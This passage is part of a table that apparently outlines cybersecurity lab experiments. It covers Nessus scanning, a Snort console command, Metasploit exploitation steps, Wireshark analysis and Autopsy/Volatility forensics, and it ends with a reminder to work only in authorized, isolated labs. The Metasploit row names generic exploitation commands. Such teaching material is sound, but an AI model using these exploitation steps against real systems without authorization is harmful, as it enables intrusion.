| 4 | Vulnerability Scanning | Nessus | Create scan → Add target → Launch |
| 5 | IDS Configuration | Snort | `sudo snort -A console -c snort.conf -i eth0` |
| 6 | Metasploit Exploitation | Metasploit, nmap | `msfconsole`, `search exploit`, `exploit` |
| 7 | Network Analysis | Wireshark | Capture → Filter → Analyze packets |
| 8 | Forensics Investigation | Autopsy, Volatility | Load image → Analyze → Generate report |

---

**Note:** All experiments should be performed in isolated lab environments with proper authorization and ethical guidelines.
